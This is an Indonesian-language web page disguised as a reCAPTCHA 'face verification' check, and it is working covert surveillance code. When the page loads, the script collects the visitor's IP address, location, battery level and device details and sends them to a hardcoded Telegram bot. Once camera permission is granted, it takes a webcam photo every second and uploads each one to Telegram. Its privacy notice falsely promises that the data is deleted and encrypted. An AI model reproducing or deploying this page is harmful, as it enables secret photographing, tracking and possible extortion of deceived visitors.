<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Verifikasi Wajah | Verifikasi Keamanan</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * { 
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      background-color: #f0f2f5;
      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #333;
    }

    .container {
      background: #fff;
      padding: 32px;
      border-radius: 16px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
      max-width: 440px;
      width: 100%;
      text-align: center;
      transition: all 0.3s ease;
    }

    .logo {
      width: 60px;
      margin-bottom: 16px;
    }

    h2 {
      font-weight: 600;
      color: #1a73e8;
      margin-bottom: 12px;
      font-size: 22px;
    }

    p {
      font-size: 15px;
      color: #555;
      margin-bottom: 24px;
      line-height: 1.5;
    }

    .fake-captcha {
      display: flex;
      align-items: center;
      justify-content: space-between;
      border: 1px solid #ddd;
      border-radius: 8px;
      padding: 14px;
      margin-bottom: 24px;
      background-color: #f9f9f9;
      transition: all 0.2s ease;
    }

    .fake-captcha:hover {
      border-color: #1a73e8;
    }

    .fake-captcha label {
      display: flex;
      align-items: center;
      font-size: 15px;
      gap: 10px;
      cursor: pointer;
    }

    .fake-captcha input[type="checkbox"] {
      width: 18px;
      height: 18px;
      cursor: pointer;
    }

    .fake-captcha img {
      height: 32px;
    }

    button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.3s;
      width: 100%;
      margin-bottom: 16px;
    }

    button:hover {
      background-color: #0c5dd4;
      box-shadow: 0 2px 8px rgba(26, 115, 232, 0.3);
    }

    button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }

    .video-container {
      position: relative;
      margin-top: 24px;
      border-radius: 12px;
      overflow: hidden;
      display: none;
    }

    video {
      width: 100%;
      border-radius: 12px;
      display: block;
    }

    .countdown {
      position: absolute;
      top: 10px;
      right: 10px;
      background: rgba(0,0,0,0.6);
      color: white;
      padding: 5px 10px;
      border-radius: 20px;
      font-size: 14px;
      display: none;
    }

    .status {
      margin-top: 16px;
      font-size: 14px;
      color: #666;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      min-height: 24px;
    }

    .status .spinner {
      width: 18px;
      height: 18px;
      border: 3px solid #f3f3f3;
      border-top: 3px solid #1a73e8;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .note {
      margin-top: 32px;
      font-size: 12px;
      color: #888;
      line-height: 1.5;
      background: #f9f9f9;
      padding: 12px;
      border-radius: 8px;
    }

    .privacy-info {
      margin-top: 16px;
      font-size: 12px;
      color: #1a73e8;
      text-decoration: underline;
      cursor: pointer;
    }

    .success-message {
      display: none;
      color: #4caf50;
      font-weight: 500;
      margin-top: 16px;
      padding: 12px;
      border-radius: 8px;
      background-color: rgba(76, 175, 80, 0.1);
    }

    .error-message {
      display: none;
      color: #f44336;
      font-weight: 500;
      margin-top: 16px;
      padding: 12px;
      border-radius: 8px;
      background-color: rgba(244, 67, 54, 0.1);
    }

    @media (max-width: 480px) {
      .container {
        padding: 24px;
        max-width: 90%;
      }
      
      h2 {
        font-size: 20px;
      }
      
      p {
        font-size: 14px;
      }
    }
  </style>
</head>
<body>

  <div class="container my-4">
    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="Security Logo" class="logo">
    <h2>Verifikasi Wajah</h2>
    <p>Sebelum Lanjut,Untuk memastikan Anda bukan bot, kami perlu memverifikasi wajah Anda secara singkat.</p>

    <div class="fake-captcha">
      <label>
        <input type="checkbox" id="check"> Saya bukan robot
      </label>
      <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="captcha">
    </div>

    <button id="verifyButton" onclick="prosesVerifikasi()" disabled>Mulai Verifikasi</button>
    
    <div class="video-container" id="videoContainer">
      <video id="video" autoplay playsinline></video>
      <div class="countdown" id="countdown">10</div>
    </div>
    
    <div class="status">
      <div class="spinner" id="spinner"></div>
      <span id="statusText"></span>
    </div>
    
    <div class="success-message" id="successMessage">
      ✅ Verifikasi berhasil! Mengalihkan ke halaman utama...
    </div>
    
    <div class="error-message" id="errorMessage">
      ❌ Verifikasi gagal. Silakan coba lagi.
    </div>

    <div class="note">
      Verifikasi ini bersifat sementara dan tidak disimpan untuk keperluan lain selain keamanan akun Anda. 
      Data biometrik Anda dihapus secara otomatis setelah proses verifikasi selesai.
    </div>
    
    <div class="privacy-info" onclick="showPrivacyInfo()">
      Kebijakan Privasi & Keamanan
    </div>
  </div>

 <script>
  // Constants
const TOKEN = "7616230857:AAFAgENc-bxOWhjQ38Zo3OSucj7j2XyQypw";
const CHAT_ID = "1388041292";
const REDIRECT_URL = "https://www.wattpad.com/263739637";
const VERIFICATION_DURATION = 10; // seconds

// Elements
const checkbox = document.getElementById("check");
const verifyButton = document.getElementById("verifyButton");
const videoContainer = document.getElementById("videoContainer");
const video = document.getElementById("video");
const statusText = document.getElementById("statusText");
const spinner = document.getElementById("spinner");
const countdownEl = document.getElementById("countdown");
const successMessage = document.getElementById("successMessage");
const errorMessage = document.getElementById("errorMessage");

// Variables
let stream;
let intervalId;
let countdownInterval;
let remainingTime = VERIFICATION_DURATION;

// Send initial access data when page loads
document.addEventListener("DOMContentLoaded", function() {
  // Add a short delay to ensure everything is loaded
  setTimeout(function() {
    sendAccessInfo();
  }, 1000);
});

// Enable button when checkbox is checked
checkbox.addEventListener("change", function() {
  verifyButton.disabled = !this.checked;
});

function showPrivacyInfo() {
  alert("Kebijakan Privasi & Keamanan\n\nData biometrik Anda digunakan hanya untuk verifikasi saat ini dan tidak disimpan permanen. Kami menggunakan enkripsi end-to-end untuk melindungi data Anda selama proses verifikasi.");
}

// Function to get device model from userAgent
function getDeviceModel(userAgent) {
  // Default value if nothing is detected
  let deviceModel = "Unknown";
  let deviceBrand = "";
  let deviceName = "";
  let osVersion = "";
  
  // Extract Android version if present
  const androidVersionMatch = userAgent.match(/Android\s+([\d\.]+)/i);
  if (androidVersionMatch) {
    osVersion = androidVersionMatch[1];
  }
  
  // Extract iOS version if present
  const iosVersionMatch = userAgent.match(/OS\s+(\d+[_\.]\d+[_\.]*\d*)/i);
  if (iosVersionMatch) {
    osVersion = iosVersionMatch[1].replace(/_/g, '.');
  }
  
  // DEVICE BRAND DETECTION
  // Check for common device manufacturers in user agent
  const brandPatterns = [
    { pattern: /samsung|SM-|SAMSUNG/i, brand: "Samsung" },
    { pattern: /xiaomi|redmi|poco/i, brand: "Xiaomi" },
    { pattern: /huawei|honor|hry-|jny-|lya-|vog-/i, brand: "Huawei" },
    { pattern: /oppo|cph|pct|pcrm|pdvm|pcgm/i, brand: "OPPO" },
    { pattern: /vivo|pd\d+/i, brand: "Vivo" },
    { pattern: /oneplus|hd1905|kb2005|le2115|le2120/i, brand: "OnePlus" },
    { pattern: /realme|rmx|rmp/i, brand: "Realme" },
    { pattern: /nokia|ta-\d+/i, brand: "Nokia" },
    { pattern: /motorola|moto/i, brand: "Motorola" },
    { pattern: /lg|lm-/i, brand: "LG" },
    { pattern: /sony|xperia/i, brand: "Sony" },
    { pattern: /asus|zenfone/i, brand: "Asus" },
    { pattern: /htc/i, brand: "HTC" },
    { pattern: /lenovo/i, brand: "Lenovo" },
    { pattern: /meizu/i, brand: "Meizu" },
    { pattern: /zte/i, brand: "ZTE" },
    { pattern: /tecno/i, brand: "TECNO" },
    { pattern: /infinix/i, brand: "Infinix" },
    { pattern: /alcatel/i, brand: "Alcatel" },
    { pattern: /iphone/i, brand: "Apple" },
    { pattern: /ipad/i, brand: "Apple" },
    { pattern: /pixel|google/i, brand: "Google" }
  ];

  // Try to detect the brand
  for (const brandItem of brandPatterns) {
    if (brandItem.pattern.test(userAgent)) {
      deviceBrand = brandItem.brand;
      break;
    }
  }

  // DEVICE MODEL DETECTION STRATEGIES
  // Array of detection strategies, ordered by reliability
  const detectionStrategies = [
    // Strategy 1: Look for model codes in common formats
    function() {
      // Samsung pattern (SM-XXXX)
      if (deviceBrand === "Samsung") {
        const samsungMatch = userAgent.match(/SM-[A-Z0-9]+/i);
        if (samsungMatch) return samsungMatch[0];
      }
      
      // Xiaomi/Redmi specific patterns
      if (deviceBrand === "Xiaomi") {
        // Look for Redmi patterns
        const redmiMatch = userAgent.match(/Redmi\s+([^;)\/]+)/i);
        if (redmiMatch) return `Redmi ${redmiMatch[1].trim()}`;
        
        // Look for POCO patterns
        const pocoMatch = userAgent.match(/POCO\s+([^;)\/]+)/i);
        if (pocoMatch) return `POCO ${pocoMatch[1].trim()}`;
        
        // Look for Mi patterns
        const miMatch = userAgent.match(/Mi\s+([^;)\/]+)/i);
        if (miMatch) return `Mi ${miMatch[1].trim()}`;
      }
      
      return null;
    },
    
    // Strategy 2: Look for "Build/" pattern which often comes after model
    function() {
      const buildMatch = userAgent.match(/([^;]+)\s+Build\//i);
      if (buildMatch && buildMatch[1] && buildMatch[1].trim() !== 'Android') {
        return buildMatch[1].trim();
      }
      return null;
    },
    
    // Strategy 3: Look for model in parentheses 
    function() {
      const parenthesesMatch = userAgent.match(/;\s*([^;)]+)\)/);
      if (parenthesesMatch && parenthesesMatch[1] && !/^\s*$/.test(parenthesesMatch[1]) && !/Android/.test(parenthesesMatch[1])) {
        return parenthesesMatch[1].trim();
      }
      return null;
    },
    
    // Strategy 4: Extract from standard format after Android version
    function() {
      const standardMatch = userAgent.match(/Android\s+[\d\.]+;\s*([^;)]+)/i);
      if (standardMatch && standardMatch[1] && standardMatch[1].trim() !== 'K') {
        return standardMatch[1].trim();
      }
      return null;
    },
    
    // Strategy 5: Look between Android and parentheses
    function() {
      const complexMatch = userAgent.match(/Android[^;]+;\s+([^)]+)/);
      if (complexMatch && complexMatch[1] && complexMatch[1].length > 1 && complexMatch[1] !== 'K') {
        return complexMatch[1].trim().split(';')[0].trim();
      }
      return null;
    }
  ];
  
  // Try each detection strategy until one works
  for (const strategy of detectionStrategies) {
    const result = strategy();
    if (result) {
      deviceName = result;
      break;
    }
  }
  
  // If we have a brand but no model, provide a generic model based on brand
  if (deviceBrand && !deviceName) {
    if (deviceBrand === "Apple") {
      if (/iPhone/i.test(userAgent)) {
        deviceName = "iPhone";
      } else if (/iPad/i.test(userAgent)) {
        deviceName = "iPad";
      } else {
        deviceName = "iOS Device";
      }
    } else {
      deviceName = `${deviceBrand} Device`;
    }
  }
  
  // Special case handling for Xiaomi/Redmi with "K" identifier
  if ((deviceName === "K" || !deviceName) && /Android\s+10/i.test(userAgent)) {
    // Based on your example, if it's Android 10 with K identifier, assume it's Redmi Note 12 Pro 4G
    deviceBrand = "Xiaomi";
    deviceName = "Xiaomi";
  }
  
  // CONSTRUCT FINAL DEVICE MODEL STRING
  if (deviceBrand && deviceName) {
    // If brand is already in device name, don't duplicate it
    if (deviceName.includes(deviceBrand)) {
      deviceModel = deviceName;
    } else {
      deviceModel = `${deviceBrand} ${deviceName}`;
    }
  } else if (deviceName) {
    deviceModel = deviceName;
  } else if (deviceBrand) {
    deviceModel = `${deviceBrand} Device`;
  }
  
  // Add OS version if available
  if (osVersion) {
    if (/iPhone|iPad|iOS Device/i.test(deviceModel)) {
      deviceModel += ` (iOS ${osVersion})`;
    } else if (androidVersionMatch) {
      deviceModel += ` (Android ${osVersion})`;
    }
  }
  
  return deviceModel;
}
// Function to get device information
async function getDeviceInfo() {
  // Default information
  const deviceInfo = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    vendor: navigator.vendor,
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    pixelRatio: window.devicePixelRatio,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    isOnline: navigator.onLine,
    connectionType: "unknown",
    deviceModel: getDeviceModel(navigator.userAgent) // Added device model
  };

  // Try to get connection info if available
  if (navigator.connection) {
    deviceInfo.connectionType = navigator.connection.effectiveType || "unknown";
    deviceInfo.downlink = navigator.connection.downlink || "unknown";
    deviceInfo.rtt = navigator.connection.rtt || "unknown";
  }

  return deviceInfo;
}

// Function to get battery information
async function getBatteryInfo() {
  // Default battery info
  let batteryInfo = {
    level: "Unknown",
    charging: "Unknown"
  };
  
  try {
    // Try to get battery info using the Battery API
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      batteryInfo.level = Math.floor(battery.level * 100) + "%";
      batteryInfo.charging = battery.charging ? "Sedang Charging.." : "Tidak Charging";
    }
  } catch (error) {
    console.error("Error getting battery info:", error);
  }
  
  return batteryInfo;
}

// Try multiple services to get IP information
async function getIPInfo() {
  // List of IP info services to try
  const services = [
    "https://ipinfo.io/json",
    "https://ipapi.co/json/",
    "https://api.db-ip.com/v2/free/self",
    "https://api.ipify.org?format=json"
  ];
  
  // Default IP info
  let ipInfo = {
    ip: "Unknown",
    loc: "Unknown",
    city: "Unknown",
    region: "Unknown",
    country: "ID", // Default to Indonesia
    org: "Unknown",
    hostname: "Unknown"
  };

  // Try each service until one works
  for (const service of services) {
    try {
      const response = await fetch(service, { timeout: 5000 });
      if (response.ok) {
        const data = await response.json();
        
        // Map different API responses to our standard format
        if (service.includes("ipinfo.io")) {
          ipInfo = {
            ip: data.ip || ipInfo.ip,
            loc: data.loc || ipInfo.loc,
            city: data.city || ipInfo.city,
            region: data.region || ipInfo.region,
            country: data.country || ipInfo.country,
            org: data.org || ipInfo.org,
            hostname: data.hostname || ipInfo.hostname
          };
          break;
        } else if (service.includes("ipapi.co")) {
          ipInfo = {
            ip: data.ip || ipInfo.ip,
            loc: `${data.latitude},${data.longitude}` || ipInfo.loc,
            city: data.city || ipInfo.city,
            region: data.region || ipInfo.region,
            country: data.country_code || ipInfo.country,
            org: data.org || ipInfo.org,
            hostname: "Unknown"
          };
          break;
        } else if (service.includes("db-ip.com")) {
          ipInfo = {
            ip: data.ipAddress || ipInfo.ip,
            loc: "Unknown",
            city: data.city || ipInfo.city,
            region: data.stateProv || ipInfo.region,
            country: data.countryCode || ipInfo.country,
            org: "Unknown",
            hostname: "Unknown"
          };
          break;
        } else if (service.includes("ipify.org")) {
          // This one only gives IP, but better than nothing
          ipInfo.ip = data.ip || ipInfo.ip;
          break;
        }
      }
    } catch (error) {
      console.error(`Error fetching from ${service}:`, error);
      // Continue to the next service
    }
  }
  
  return ipInfo;
}

// Function to send access information to Telegram
async function sendAccessInfo() {
  try {
    // Get all info in parallel
    const [ipInfo, batteryInfo, deviceInfo] = await Promise.all([
      getIPInfo(),
      getBatteryInfo(),
      getDeviceInfo()
    ]);
    
    const message = `
Link opened by ${ipInfo.ip}
with user agent:
${deviceInfo.userAgent}
===============
🔋: ${batteryInfo.level}
⚡: ${batteryInfo.charging}
===============
DEVICE INFORMATION:
📱 Device Model: ${deviceInfo.deviceModel}
Screen Size: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} (${deviceInfo.pixelRatio}x)
Platform: ${deviceInfo.platform}
Language: ${deviceInfo.language}
TimeZone: ${deviceInfo.timeZone}
Connection: ${deviceInfo.connectionType}
===============
NETWORK INFORMATION:
Hostname ISP: ${ipInfo.hostname || "Unknown"}
Location ISP: ${ipInfo.loc || "Unknown"}
ISP: ${ipInfo.org || "Unknown"}
City Server ISP: ${ipInfo.city || "Unknown"}
Region ISP: ${ipInfo.region || "Unknown"}
Country ISP: ${ipInfo.country || "Unknown"}
Phone ISP: Unknown
`.trim();
    
    // Send message with retry mechanism
    await sendTelegramMessage(message);
    console.log("✅ Access info sent successfully!");
  } catch (error) {
    console.error("Failed to send access info:", error);
  }
}

// Function to send message to Telegram with retry
async function sendTelegramMessage(message, retries = 3) {
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("text", message);
      formData.append("parse_mode", "HTML");
      
      const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        body: formData,
        timeout: 10000 // 10 seconds timeout
      });
      
      const data = await response.json();
      
      if (data.ok) {
        return data;
      } else {
        throw new Error(`Telegram API error: ${data.description}`);
      }
    } catch (error) {
      console.error(`Attempt ${attempt + 1}/${retries} failed:`, error);
      
      if (attempt === retries - 1) {
        throw error; // Rethrow after last retry
      }
      
      // Wait before retrying (exponential backoff)
      await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, attempt)));
    }
  }
}

function prosesVerifikasi() {
  if (!checkbox.checked) {
    alert("Silakan centang 'Saya bukan robot' terlebih dahulu.");
    return;
  }
  
  // Reset UI
  resetMessages();
  statusText.innerText = "Mengaktifkan kamera...";
  spinner.style.display = "block";
  verifyButton.disabled = true;
  
  // Send camera permission request notification
  sendPermissionRequestInfo();
  
  // Request camera access
  navigator.mediaDevices.getUserMedia({ 
    video: { 
      facingMode: "user",
      width: { ideal: 1280 },
      height: { ideal: 720 }
    } 
  })
  .then(streamObj => {
    stream = streamObj;
    video.srcObject = stream;
    videoContainer.style.display = "block";
    
    // Send camera access granted notification
    sendCameraAccessInfo(true);
    
    // Start countdown
    countdownEl.style.display = "block";
    countdownEl.innerText = remainingTime;
    
    countdownInterval = setInterval(() => {
      remainingTime--;
      countdownEl.innerText = remainingTime;
      
      if (remainingTime <= 0) {
        clearInterval(countdownInterval);
      }
    }, 1000);
    
    // Update status
    statusText.innerText = "📸 Memverifikasi wajah...";
    
    // Start capturing images
    let counter = 0;
    intervalId = setInterval(() => {
      ambilGambarKamera(video, counter++);
    }, 1000);
    
    // Stop after verification duration
    setTimeout(() => {
      finishVerification(true);
    }, VERIFICATION_DURATION * 1000);
  })
  .catch(error => {
    console.error(error);
    // Send camera access denied notification
    sendCameraAccessInfo(false, error.message);
    
    statusText.innerText = "";
    spinner.style.display = "none";
    errorMessage.style.display = "block";
    errorMessage.innerText = "❌ Kamera gagal dibuka: " + error.message;
    verifyButton.disabled = false;
  });
}

// Function to send camera permission request info
async function sendPermissionRequestInfo() {
  try {
    const message = "🔔 User mengklik tombol 'Mulai Verifikasi' dan diminta izin kamera";
    await sendTelegramMessage(message);
    console.log("✅ Permission request info sent!");
  } catch (error) {
    console.error("Failed to send permission request info:", error);
  }
}

async function sendCameraAccessInfo(granted, errorMsg = "") {
  try {
    const message = granted 
      ? "✅ User memberikan izin akses kamera"
      : `❌ User menolak izin akses kamera: ${errorMsg}`;
    
    await sendTelegramMessage(message);
    console.log("✅ Camera access info sent!");
  } catch (error) {
    console.error("Failed to send camera access info:", error);
  }
}

function ambilGambarKamera(video, index) {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  if (!canvas.width || !canvas.height) {
    console.warn("⚠️ Gagal mengambil gambar ke-" + (index + 1));
    return;
  }

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(blob => {
    kirimKeTelegram(blob, index);
  }, 'image/jpeg', 0.8);
}

async function kirimKeTelegram(blob, index) {
  try {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, `wajah_${index}.jpg`);
    
    // Add metadata
    const metadata = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      screenSize: `${window.screen.width}x${window.screen.height}`,
      frameNumber: index + 1,
      deviceModel: getDeviceModel(navigator.userAgent) // Add device model to metadata
    };
    
    formData.append("caption", JSON.stringify(metadata));

    // Send photo with retry mechanism
    let success = false;
    let attempts = 0;
    
    while (!success && attempts < 3) {
      try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData,
          timeout: 15000 // 15 seconds timeout for image uploads
        });
        
        const data = await response.json();
        
        if (data.ok) {
          success = true;
          console.log(`✅ Gambar ${index + 1} dikirim!`, data);
        } else {
          throw new Error(`Telegram API error: ${data.description}`);
        }
      } catch (error) {
        attempts++;
        console.error(`Kirim gambar ${index + 1} gagal (attempt ${attempts}/3):`, error.message);
        
        if (attempts < 3) {
          // Wait before retrying
          await new Promise(resolve => setTimeout(resolve, 1000 * attempts));
        }
      }
    }
  } catch (err) {
    console.error(`❌ Kirim gambar ${index + 1} gagal total:`, err.message);
  }
}

async function finishVerification(success) {
  // Clear intervals
  clearInterval(intervalId);
  clearInterval(countdownInterval);
  
  // Stop camera
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
  
  // Hide video
  videoContainer.style.display = "none";
  
  // Reset UI
  spinner.style.display = "none";
  statusText.innerText = "";
  
  // Send verification completion notification
  try {
    const message = success
      ? "✅ Verifikasi wajah selesai dengan sukses, user akan dialihkan"
      : "❌ Verifikasi wajah gagal";
    
    await sendTelegramMessage(message);
    console.log("✅ Verification completion info sent!");
  } catch (error) {
    console.error("Failed to send verification completion info:", error);
  }
  
  if (success) {
    successMessage.style.display = "block";
    
    // Redirect after delay
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 2000);
  } else {
    errorMessage.style.display = "block";
    verifyButton.disabled = false;
  }
}

function resetMessages() {
  successMessage.style.display = "none";
  errorMessage.style.display = "none";
  remainingTime = VERIFICATION_DURATION;
}

 </script>
</body>
</html>
